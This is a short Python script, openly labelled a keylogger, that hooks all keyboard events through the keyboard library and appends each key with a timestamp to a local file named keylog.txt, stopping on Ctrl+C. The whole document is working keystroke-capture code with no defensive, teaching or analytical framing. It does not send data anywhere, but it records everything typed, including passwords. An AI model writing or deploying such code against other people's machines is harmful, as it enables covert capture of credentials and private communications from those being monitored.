import keyboard
from datetime import datetime

def log_keypress(key):
    with open('keylog.txt', 'a') as f:
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        f.write(f"[{current_time}] - {key}\n")

# Function to stop the keylogger
def stop_keylogging():
    keyboard.unhook_all()
    print("Keylogging stopped.")

# Start the keylogger with a specific key combination to stop it (Ctrl+C in this case)
keyboard.add_hotkey('ctrl+c', stop_keylogging)

try:
    # Keep the program running and listen for key presses
    while True:
        log_keypress(keyboard.read_event().name)
except KeyboardInterrupt:
    print("Keylogging stopped.")

